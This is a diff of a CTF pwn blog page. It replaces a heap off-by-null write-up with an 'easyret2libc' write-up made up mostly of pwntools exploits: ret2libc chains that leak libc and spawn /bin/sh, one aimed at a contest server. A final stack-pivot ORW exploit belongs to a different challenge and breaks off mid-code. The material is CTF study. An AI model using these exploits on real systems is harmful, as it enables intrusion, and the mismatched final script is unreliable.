@@ -19,40 +19,31 @@
   <meta name="author" content="henan808">
   <meta name="keywords" content="">
   
-    <meta name="description" content="12patchelf --set-interpreter &#x2F;home&#x2F;nan&#x2F;桌面&#x2F;pwn&#x2F;2.27-3ubuntu1_amd64&#x2F;ld-2.27.so .&#x2F;pwnpatchelf --set-rpath &#x2F;home&#x2F;nan&#x2F;桌面&#x2F;pwn&#x2F;2.27-3ubuntu1_amd64 .&#x2F;pwn  因为是ubuntu18所以修改一下相关连接器 检查命令 1ldd .&#x2F;pwn   这个是修改成绝对路径">
+    <meta name="description" content="2026鲲鹏杯   没有开什么保护 也是轻松溢出 但是没有system函数，所以还是泄露libc 1230x000000000040101a : ret0x000000000040117e : pop rdi ; ret  里面有puts函数   溢出大小： 0x20+0x8  接收到地址  脚本 123456789101112131415161718192021222324252627282">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hitcon2018childrentcache（off by null）">
-<meta property="og:url" content="https://henan808.github.io/pwn-notes/2026/11/13/sync-typora-pwn-hitcon2018childrentcache-off-by-null-b2acde/index.html">
+<meta property="og:title" content="easyret2libc">
+<meta property="og:url" content="https://henan808.github.io/pwn-notes/2026/11/25/sync-typora-pwn-easyret2libc-c37693/index.html">
 <meta property="og:site_name" content="Pwn Notes">
-<meta property="og:description" content="12patchelf --set-interpreter &#x2F;home&#x2F;nan&#x2F;桌面&#x2F;pwn&#x2F;2.27-3ubuntu1_amd64&#x2F;ld-2.27.so .&#x2F;pwnpatchelf --set-rpath &#x2F;home&#x2F;nan&#x2F;桌面&#x2F;pwn&#x2F;2.27-3ubuntu1_amd64 .&#x2F;pwn  因为是ubuntu18所以修改一下相关连接器 检查命令 1ldd .&#x2F;pwn   这个是修改成绝对路径">
+<meta property="og:description" content="2026鲲鹏杯   没有开什么保护 也是轻松溢出 但是没有system函数，所以还是泄露libc 1230x000000000040101a : ret0x000000000040117e : pop rdi ; ret  里面有puts函数   溢出大小： 0x20+0x8  接收到地址  脚本 123456789101112131415161718192021222324252627282">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102164658329.png">
-<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102164809384.png">
-<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102165537226.png">
-<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102165657594.png">
-<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102182014196.png">
-<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102182140557.png">
-<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102182614232.png">
-<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102202426955.png">
-<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102204821622.png">
-<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102205228954.png">
-<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102205453912.png">
-<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102210048067.png">
-<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102211955995.png">
-<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102212008994.png">
-<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102212649648.png">
-<meta property="article:published_time" content="2026-11-13T11:08:05.000Z">
-<meta property="article:modified_time" content="2026-11-13T11:42:18.156Z">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261120173444416.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261120173555332.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261120174520483.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261120174740541.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261120175432477.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261120181505043.png">
+<meta property="article:published_time" content="2026-11-25T02:02:11.000Z">
+<meta property="article:modified_time" content="2026-11-25T16:29:00.632Z">
 <meta property="article:author" content="henan808">
-<meta property="article:tag" content="unsorted-bin">
-<meta property="article:tag" content="double-free">
-<meta property="article:tag" content="off-by-null">
+<meta property="article:tag" content="ROP">
+<meta property="article:tag" content="canary">
+<meta property="article:tag" content="glibc2.35">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102164658329.png">
+<meta name="twitter:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261120173444416.png">
   
   
   
-  <title>hitcon2018childrentcache（off by null） - Pwn Notes</title>
+  <title>easyret2libc - Pwn Notes</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -321,7 +312,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="hitcon2018childrentcache（off by null）"></span>
+            <span id="subtitle" data-typed-text="easyret2libc"></span>
           
         </div>
 
@@ -337,8 +328,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2026-11-13 19:08" pubdate>
-          2026-11-13 19:08
+        <time datetime="2026-11-25 10:02" pubdate>
+          2026-11-25 10:02
         </time>
       </span>
     
@@ -349,7 +340,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.1k 字
+          6.2k 字
         
       </span>
     
@@ -360,7 +351,7 @@
         
         
         
-          10 分钟
+          52 分钟
         
       </span>
     
@@ -412,7 +403,7 @@
         aria-expanded="true"
       >
         题目复现
-        <span class="list-group-count">(13)</span>
+        <span class="list-group-count">(14)</span>
         <i class="iconfont icon-arrowright"></i>
       </a>
       
@@ -490,7 +481,7 @@
     
       
       
-        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-ciscn2019final3-58c6fc/" title="ciscn2019final3"
+        <a href="/pwn-notes/2026/11/25/sync-typora-pwn-ciscn2019final3-58c6fc/" title="ciscn2019final3"
            class="list-group-item list-group-item-action
            ">
           <span class="category-post">ciscn2019final3</span>
@@ -525,17 +516,17 @@
     
     
     <div class="category-sub row nomargin-x">
-      <a class="category-subitem 
+      <a class="category-subitem collapsed
           list-group-item category-item-action col-10 col-md-11 col-xm-11" title="HITCON"
         id="heading-8f64721be0067542591093019292b028" role="tab" data-toggle="collapse" href="#collapse-8f64721be0067542591093019292b028"
-        aria-expanded="true"
+        aria-expanded="false"
       >
         HITCON
         <span class="list-group-count">(3)</span>
         <i class="iconfont icon-arrowright"></i>
       </a>
       
-      <div class="category-collapse collapse show" id="collapse-8f64721be0067542591093019292b028"
+      <div class="category-collapse collapse " id="collapse-8f64721be0067542591093019292b028"
            role="tabpanel" aria-labelledby="heading-8f64721be0067542591093019292b028">
         
         
@@ -545,9 +536,9 @@
     
       
       
-        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-hitcon2018childrentcache-off-by-null-b2acde/" title="hitcon2018childrentcache（off by null）"
+        <a href="/pwn-notes/2026/11/25/sync-typora-pwn-hitcon2018childrentcache-off-by-null-b2acde/" title="hitcon2018childrentcache（off by null）"
            class="list-group-item list-group-item-action
-           active">
+           ">
           <span class="category-post">hitcon2018childrentcache（off by null）</span>
         </a>
       
@@ -711,7 +702,7 @@
     
       
       
-        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-how2heap-c67585/" title="HOW2HEAP"
+        <a href="/pwn-notes/2026/11/25/sync-typora-pwn-how2heap-c67585/" title="HOW2HEAP"
            class="list-group-item list-group-item-action
            ">
           <span class="category-post">HOW2HEAP</span>
@@ -728,23 +719,32 @@
     
     
     <div class="category-sub row nomargin-x">
-      <a class="category-subitem collapsed
+      <a class="category-subitem 
           list-group-item category-item-action col-10 col-md-11 col-xm-11" title="其他赛事"
         id="heading-cc195e58b34754a13fcd0d59c782bfee" role="tab" data-toggle="collapse" href="#collapse-cc195e58b34754a13fcd0d59c782bfee"
-        aria-expanded="false"
+        aria-expanded="true"
       >
         其他赛事
-        <span class="list-group-count">(1)</span>
+        <span class="list-group-count">(2)</span>
         <i class="iconfont icon-arrowright"></i>
       </a>
       
-      <div class="category-collapse collapse " id="collapse-cc195e58b34754a13fcd0d59c782bfee"
+      <div class="category-collapse collapse show" id="collapse-cc195e58b34754a13fcd0d59c782bfee"
            role="tabpanel" aria-labelledby="heading-cc195e58b34754a13fcd0d59c782bfee">
         
         
           
   <div class="category-post-list">
     
+    
+      
+      
+        <a href="/pwn-notes/2026/11/25/sync-typora-pwn-easyret2libc-c37693/" title="easyret2libc"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">easyret2libc</span>
+        </a>
+      
     
       
       
@@ -814,69 +814,39 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">hitcon2018childrentcache（off by null）</h1>
+            <h1 id="seo-header">easyret2libc</h1>
             
             
               <div class="markdown-body">
                 
                 <!-- 本文件由 tools/sync_notes.py 生成，请勿手动编辑；改 notes/ 里的源笔记后重新同步 -->
-<!-- sync-source: notes/external/typora-pwn/pwn题目.md#9 -->
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">patchelf --set-interpreter /home/nan/桌面/pwn/2.27-3ubuntu1_amd64/ld-2.27.so ./pwn<br>patchelf --set-rpath /home/nan/桌面/pwn/2.27-3ubuntu1_amd64 ./pwn<br></code></pre></td></tr></table></figure>
+<!-- sync-source: notes/external/typora-pwn/pwn题目.md#14 -->
+<p>2026鲲鹏杯</p>
+<p><img src="/pwn-notes/images/notes/image-20261120173444416.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261120173444416"></p>
+<p><img src="/pwn-notes/images/notes/image-20261120173555332.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261120173555332"></p>
+<p>没有开什么保护</p>
+<p>也是轻松溢出</p>
+<p>但是没有system函数，所以还是泄露libc</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x000000000040101a</span> : <span class="hljs-keyword">ret</span><br><span class="hljs-number">0x000000000040117e</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span> <span class="hljs-comment">; ret</span><br><br></code></pre></td></tr></table></figure>
 
-<p>因为是ubuntu18所以修改一下相关连接器</p>
-<p>检查命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ldd ./pwn<br></code></pre></td></tr></table></figure>
+<p>里面有puts函数</p>
+<p><img src="/pwn-notes/images/notes/image-20261120174520483.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261120174520483"></p>
+<p><img src="/pwn-notes/images/notes/image-20261120174740541.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261120174740541"></p>
+<p>溢出大小：</p>
+<p>0x20+0x8</p>
+<p><img src="/pwn-notes/images/notes/image-20261120175432477.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261120175432477"></p>
+<p>接收到地址</p>
+<p><img src="/pwn-notes/images/notes/image-20261120181505043.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261120181505043"></p>
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>p =remote(<span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="hljs-number">47628</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>ret = <span class="hljs-number">0x40101a</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>vlun = <span class="hljs-number">0x401183</span><br>pop_rdi = <span class="hljs-number">0x40117e</span><br><br><span class="hljs-comment"># ================= 第一次溢出：泄露 puts 真实地址 =================</span><br>pay = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span><br>pay += p64(ret)       <span class="hljs-comment"># 栈对齐</span><br>pay += p64(pop_rdi)   <span class="hljs-comment"># 把 puts_got 传给 rdi</span><br>pay += p64(puts_got)<br>pay += p64(puts_plt)  <span class="hljs-comment"># 调用 puts 打印地址</span><br>pay += p64(vlun)      <span class="hljs-comment"># 返回漏洞函数，准备二次溢出</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;name: &#x27;</span>)<br>p.sendline(pay)<br><br><span class="hljs-comment"># 接收泄露的地址（注意这里，用 recv(6) 最稳）</span><br><span class="hljs-comment"># 假设程序会打印一些废话，再打印地址。如果是直接打印，就直接 recv(6)</span><br><span class="hljs-comment"># 你可以根据实际输出情况修改 recvuntil 的字符串</span><br>p.recvuntil(<span class="hljs-string">b&#x27;you!\n&#x27;</span>) <span class="hljs-comment"># 假设泄漏前有这句，如果没有请删掉</span><br>leak_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">f&quot;Puts Leak: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(leak_addr)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># ================= 计算 Libc 基址 =================</span><br>libc_base = leak_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br>log.success(<span class="hljs-string">f&quot;Libc Base: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;System: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(system_addr)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;Binsh: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(binsh_addr)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># ================= 第二次溢出：执行 system(&quot;/bin/sh&quot;) =================</span><br><span class="hljs-comment"># 注意：此时缓冲区可能还有没接收干净的字符（比如换行符）。</span><br><span class="hljs-comment"># 我们直接发送 payload，如果是本地，send 后面加个 pause() 看看</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x28</span><br>payload += p64(ret)       <span class="hljs-comment"># 栈对齐</span><br>payload += p64(pop_rdi)   <span class="hljs-comment"># 传参 /bin/sh</span><br>payload += p64(binsh_addr)<br>payload += p64(ret)       <span class="hljs-comment"># 栈对齐（保证进入 system 时 RSP % 16 == 0）</span><br>payload += p64(system_addr)<br><br><span class="hljs-comment"># 确认一下是否真的回到了 name: </span><br><span class="hljs-comment"># 如果卡住，可以直接尝试删掉这句 recvuntil</span><br>p.recvuntil(<span class="hljs-string">b&#x27;name: &#x27;</span>) <br>p.sendline(payload)<br><br><span class="hljs-comment"># 成功拿到 shell</span><br>p.interactive()<br></code></pre></td></tr></table></figure>
 
-<p><img src="/pwn-notes/images/notes/image-20261102164658329.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102164658329"></p>
-<p>这个是修改成绝对路径成功的</p>
-<p><img src="/pwn-notes/images/notes/image-20261102164809384.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102164809384"></p>
-<p>检查，还需要泄露libc地址</p>
-<p>Ida分析</p>
-<p>add函数</p>
-<p><img src="/pwn-notes/images/notes/image-20261102165537226.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102165537226"></p>
-<p>show函数</p>
-<p><img src="/pwn-notes/images/notes/image-20261102165657594.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102165657594"></p>
-<p>而off by null漏洞就是看的是strcpy函数来触发的</p>
-<p>然后就是那四个堆块，首先释放那个chunk0进入unsortedbin (为了之后修改完相关操作之后，发现是空闲的，因此向前合并)</p>
-<p>接下来chunk1,因为申请有先后顺序，所以一开始在申请完之后释放掉，之后再次申请相同大小的堆块，之后利用add函数的添加内容操作进行修改chun2的presize位</p>
-<p>首先创建完堆块之后</p>
-<p>tcache大小条件：</p>
-<p><strong><code>[0x20, 0x410]</code></strong></p>
-<p>所以如果好计算地址的话，那么就直接0x4f0,因为增加对头就会补充到0x500</p>
-<p><img src="/pwn-notes/images/notes/image-20261102182014196.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102182014196"></p>
-<p>接下来释放·chun0和chunk1</p>
-<p><img src="/pwn-notes/images/notes/image-20261102182140557.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102182140557"></p>
-<p>一个进入unsortedbin 一个进入tcache</p>
-<p>接下来再次申请0x58大小的堆块，并且写入数据覆盖到</p>
-<p><img src="/pwn-notes/images/notes/image-20261102182614232.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102182614232"></p>
-<p>这个是目前chunk1的状态，可以看到其数据区确实是填充到了chunk2的pre_size的位置</p>
-<p>然后再次申请和tcashe大小相同的堆块</p>
-<p><img src="/pwn-notes/images/notes/image-20261102202426955.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102202426955"></p>
-<p>可以看到填充到头部的同时，也将chunk2的低字节改写成了0（strcpy）</p>
-<p>现在需要修改chunk2的pre_size位</p>
-<p>这里你释放之后再次申请，其实序号会变化，也就是会变成chunk0</p>
-<p>噗，自己想通过直接写入修改其0x50-0x58字节，不会试过</p>
-<p>所以用的人家的循环写入</p>
-<p><img src="/pwn-notes/images/notes/image-20261102204821622.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102204821622"></p>
-<p>之后的话直接将大小写入就行</p>
-<p><img src="/pwn-notes/images/notes/image-20261102205228954.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102205228954"></p>
-<p>就像是这样</p>
-<p>之后的话直接freechunk2这样的话，chunk1和chunk0就会合并和chunk2</p>
-<p><img src="/pwn-notes/images/notes/image-20261102205453912.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102205453912"></p>
-<p>free之后就是这样</p>
-<p>这样的话没就把chunk1也包含进去了</p>
-<p><img src="/pwn-notes/images/notes/image-20261102210048067.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102210048067"></p>
-<p>delete 0之后有申请了一个，有释放掉了2，所以再次申请的话，那么就会成为1</p>
-<p>不不不。你把那个原来的chunk0申请完之后，此时那个unsortedbin的头部就会成为原来Index0也就是那个0x60大小头部，所以最后只需要show(0)就可以得到libc地址</p>
-<p>所以现在的chunk1的地址在bin中出现，又在没有被free掉的里面出现</p>
-<p><img src="/pwn-notes/images/notes/image-20261102211955995.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102211955995"></p>
-<p><img src="/pwn-notes/images/notes/image-20261102212008994.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102212008994"></p>
-<p>而这个时候如果再释放hcunk1的话，那么就会double free(不对)</p>
-<p>应该是再次申请和chunk1大小相同的堆块，然后因为Index0指向它，还有新申请的index2指向他，接着分别释放，就可以</p>
-<p><img src="/pwn-notes/images/notes/image-20261102212649648.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102212649648"></p>
-<p>就像这样</p>
-<p>接着就是将free_hook的地址写入，之后就修改吧</p>
-<!-- sync-hash: f7c774114ec26bae7a828b24c352f1c45f14aed55b8de24fdef064cf2625097b -->
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>ret=<span class="hljs-number">0x40101a</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>vlun=<span class="hljs-number">0x401183</span><br>pop_rdi=<span class="hljs-number">0x40117e</span><br>pay=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(ret)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vlun)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;name: &#x27;</span>)<br>p.sendline(pay)<br>p.recvuntil(<span class="hljs-string">b&#x27;you!\n&#x27;</span>)<br>leak_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><br>libc_base = leak_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x28</span>+p64(ret)<br>payload += p64(pop_rdi) <br>payload += p64(binsh_addr)<br>payload += p64(ret)<br>payload += p64(system_addr)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;name: &#x27;</span>)<br>p.sendline(payload)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>别跟我说就只是少接受一个\n</p>
+<p>直接给你完整exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">afterimage 最终 exp —— 栈迁移版（glibc 2.35）</span><br><span class="hljs-string"></span><br><span class="hljs-string">为什么需要栈迁移：</span><br><span class="hljs-string">  write() 是循环 read，累计上限 0x130 字节。从 ret addr(buf+0x98) 起只剩</span><br><span class="hljs-string">  0x98=152 字节，放不下完整 orw 链(约 0x100+)。原来 0x198 的 payload 被截断。</span><br><span class="hljs-string">  本脚本：栈上放短链 read(0,bss,0x400) 把长链读进 bss，再 leave;ret 迁过去。</span><br><span class="hljs-string"></span><br><span class="hljs-string">要点：</span><br><span class="hljs-string">  - saved rbp 覆盖成 BSS-8，配合程序自带的 leave;ret(0x127b) 迁移到 BSS</span><br><span class="hljs-string">  - bss 用 0x4100（避开 0x4020/4030/4040 的 stdout/stdin/stderr 指针）</span><br><span class="hljs-string">  - libc 基址：%15$p = puts+346，与版本无关</span><br><span class="hljs-string">  - seccomp 禁 open/execve，orw 走 openat</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>, checksec=<span class="hljs-literal">False</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="hljs-literal">False</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>PREVIEW_RET = <span class="hljs-number">0x1768</span><br>LEAVE_RET   = <span class="hljs-number">0x127b</span>     <span class="hljs-comment"># 程序自带 leave ; ret</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">c</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;&gt; &#x27;</span>)<br>    p.send(c)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">preview</span>(<span class="hljs-params">fmt</span>):<br>    menu(<span class="hljs-string">b&#x27;1\n&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;format:\n&#x27;</span>)<br>    p.send(fmt + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">return</span> p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment"># ---------- 1. leak canary + PIE ----------</span><br>out = preview(<span class="hljs-string">b&#x27;%23$p.%25$p&#x27;</span>)<br>canary   = <span class="hljs-built_in">int</span>(out.split(<span class="hljs-string">b&#x27;.&#x27;</span>)[<span class="hljs-number">0</span>], <span class="hljs-number">16</span>)<br>pie_base = <span class="hljs-built_in">int</span>(out.split(<span 